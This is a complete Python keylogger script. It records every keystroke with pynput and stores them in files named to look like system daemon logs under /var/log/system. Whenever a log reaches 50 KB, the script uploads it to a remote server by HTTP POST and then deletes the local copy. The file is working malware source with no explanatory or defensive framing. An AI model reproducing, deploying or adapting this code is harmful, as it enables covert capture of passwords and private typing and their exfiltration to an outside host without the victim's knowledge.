#!/usr/bin/env python3
from pynput.keyboard import Listener
from pathlib import Path
import logging
import datetime
import requests
import os

# === Configuration ===
MAX_SIZE = 50 * 1024
SERVER_URL = "https://files-sgn.jameskaois.com/upload"
LOG_DIR = Path("/var/log/system")
ACTIVE_FILE = LOG_DIR / "daemon_current.txt"

# === Helper functions ===
def current_logfile():
    """Generate a new log filename based on timestamp."""
    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    return LOG_DIR / f"daemon_log_{ts}.txt"

def get_active_logfile():
    """Return the current active logfile, or create one."""
    if ACTIVE_FILE.exists():
        path = Path(ACTIVE_FILE.read_text().strip())
        if path.exists():
            return path
    new_path = current_logfile()
    ACTIVE_FILE.write_text(str(new_path))
    return new_path

def check_file_size(file_path):
    """Calculate file size of log txt."""
    try:
      file_size = os.path.getsize(file_path)
      if file_size >= MAX_SIZE:
          return True
      else: 
          return False
    except OSError as e:
      print(f"Error accessing file '{file_path}': {e}")
      return False

def upload_and_reset(file_path):
    """Upload file via POST, delete it, create a new one."""
    try:
        with open(file_path, "rb") as f:
            files = {"file": f}
            print(f"[+] Uploading {file_path} → Remote Server")
            requests.post(SERVER_URL, files=files, timeout=5)
    except Exception as e:
        print(f"[!] Upload failed: {e}")
        return file_path  # keep same file if failed

    try:
        os.remove(file_path)
        print(f"[+] Removed {file_path}")
    except Exception as e:
        print(f"[!] Could not remove {file_path}: {e}")

    new_path = current_logfile()
    ACTIVE_FILE.write_text(str(new_path))
    with open(new_path, 'w') as file:
      print(f"[+] Created {file_path}")
    change_log_file(new_path)
    return new_path

def setup_logging(logfile_path):
    """Configure logging to a given file."""
    logging.basicConfig(
        filename=str(logfile_path),
        level=logging.DEBUG,
        format="%(asctime)s: %(message)s"
    )

def change_log_file(new_logfile_path):
  """
  Finds the existing FileHandler, removes it, and adds a new one.
  """
  logger = logging.getLogger()
  
  old_handler = None
  for handler in logger.handlers:
      if isinstance(handler, logging.FileHandler):
          old_handler = handler
          break

  if old_handler:
      formatter = old_handler.formatter
    
      old_handler.close()
      logger.removeHandler(old_handler)

      new_handler = logging.FileHandler(str(new_logfile_path))
      new_handler.setFormatter(formatter) # Apply the same format
      logger.addHandler(new_handler)
      
      print(f"[+] Logging path changed to: {new_logfile_path}")
  else:
      print("[!] No FileHandler found to replace.")


# === Main logic ===
logfile = get_active_logfile()
setup_logging(logfile)

def on_press(key):
    global logfile
    logging.info(str(key))
    if check_file_size(logfile):
        logfile = upload_and_reset(logfile)

with Listener(on_press=on_press) as listener:
    listener.join()
